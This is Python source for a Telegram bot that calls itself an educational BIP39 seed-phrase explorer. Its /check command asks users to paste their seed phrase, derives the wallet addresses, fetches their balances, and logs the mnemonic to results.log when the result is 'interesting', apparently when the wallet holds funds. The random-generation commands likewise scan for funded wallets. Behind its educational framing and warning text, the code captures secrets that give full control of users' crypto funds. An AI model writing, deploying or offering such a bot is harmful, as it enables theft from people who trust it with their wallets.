"""
Mnemonic Explorer Bot
Educational tool for understanding BIP39 seed phrases and HD wallet derivation.
"""

import asyncio
import logging
import os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

from wallet import WalletDeriver
from balances import BalanceFetcher
from logger import ResultsLogger
from config import BOT_TOKEN, HELP_TEXT

# ── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

deriver  = WalletDeriver()
fetcher  = BalanceFetcher()
results_logger = ResultsLogger("results.log")


# ── Helpers ──────────────────────────────────────────────────────────────────

async def process_mnemonic(mnemonic: str, update: Update, label: str) -> None:
    """Derive addresses, fetch balances, and reply."""
    msg = await update.message.reply_text(
        "⏳ Deriving addresses and fetching balances…", parse_mode=ParseMode.HTML
    )

    try:
        addresses = deriver.derive_all(mnemonic)
        balances  = await fetcher.fetch_all(addresses)
        reply     = format_reply(mnemonic, addresses, balances, label)
        results_logger.log_if_interesting(mnemonic, addresses, balances)
        await msg.edit_text(reply, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception as exc:
        log.exception("Error processing mnemonic")
        await msg.edit_text(f"❌ Error: <code>{exc}</code>", parse_mode=ParseMode.HTML)


def format_reply(mnemonic: str, addresses: dict, balances: dict, label: str) -> str:
    words = mnemonic.split()
    word_count = len(words)
    numbered = " ".join(f"{i+1}.{w}" for i, w in enumerate(words))

    lines = [
        f"🧠 <b>Mnemonic Explorer Bot</b> — {label}",
        "",
        f"📝 <b>Seed Phrase ({word_count} words):</b>",
        f"<code>{numbered}</code>",
        "",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "📊 <b>Derived Addresses & Balances</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "",
    ]

    chain_meta = {
        "ethereum":        ("🔷", "Ethereum",       "ETH",  "m/44'/60'/0'/0/0"),
        "bitcoin_legacy":  ("🔶", "Bitcoin Legacy",  "BTC",  "m/44'/0'/0'/0/0"),
        "bitcoin_segwit":  ("🟠", "Bitcoin SegWit",  "BTC",  "m/49'/0'/0'/0/0"),
        "bitcoin_native":  ("🟡", "Bitcoin Native",  "BTC",  "m/84'/0'/0'/0/0"),
        "bnb":             ("🟢", "BNB Smart Chain", "BNB",  "m/44'/60'/0'/0/0"),
        "solana":          ("🟣", "Solana",           "SOL",  "m/44'/501'/0'/0'"),
    }

    for key, (icon, name, symbol, path) in chain_meta.items():
        addr = addresses.get(key, "N/A")
        bal  = balances.get(key, "?")
        lines += [
            f"{icon} <b>{name}</b>",
            f"   Path: <code>{path}</code>",
            f"   Address: <code>{addr}</code>",
            f"   Balance: <b>{bal} {symbol}</b>",
            "",
        ]

    lines += [
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "⚠️ <i>Educational use only. Never share real seed phrases.</i>",
    ]

    return "\n".join(lines)


# ── Command Handlers ──────────────────────────────────────────────────────────

async def cmd_generate12(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    mnemonic = deriver.generate_mnemonic(12)
    await process_mnemonic(mnemonic, update, "🎲 Random 12-word")


async def cmd_generate24(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    mnemonic = deriver.generate_mnemonic(24)
    await process_mnemonic(mnemonic, update, "🎲 Random 24-word")


async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if context.args:
        phrase = " ".join(context.args).strip()
    else:
        await update.message.reply_text(
            "📨 Please send your seed phrase after the command:\n"
            "<code>/check word1 word2 ... word12</code>\n\n"
            "Supports 12 or 24-word phrases.",
            parse_mode=ParseMode.HTML,
        )
        return

    word_count = len(phrase.split())
    if word_count not in (12, 24):
        await update.message.reply_text(
            f"❌ Got <b>{word_count} words</b>. Please provide exactly 12 or 24 words.",
            parse_mode=ParseMode.HTML,
        )
        return

    if not deriver.is_valid_mnemonic(phrase):
        await update.message.reply_text(
            "❌ Invalid mnemonic. Please check your seed phrase — some words may not be in the BIP39 wordlist, "
            "or the checksum is incorrect.",
            parse_mode=ParseMode.HTML,
        )
        return

    await process_mnemonic(phrase, update, f"🔍 Checked {word_count}-word")


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(HELP_TEXT, parse_mode=ParseMode.HTML)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "👋 Welcome to <b>Mnemonic Explorer Bot</b>!\n\n"
        "This is an educational tool to understand how BIP39 seed phrases and HD wallet "
        "derivation work across multiple blockchains.\n\n"
        "Type /help to see all commands.",
        parse_mode=ParseMode.HTML,
    )


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN is not set. Please check your .env file.")

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",       cmd_start))
    app.add_handler(CommandHandler("help",        cmd_help))
    app.add_handler(CommandHandler("generate12",  cmd_generate12))
    app.add_handler(CommandHandler("generate24",  cmd_generate24))
    app.add_handler(CommandHandler("check",       cmd_check))

    log.info("🚀 Mnemonic Explorer Bot is running…")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
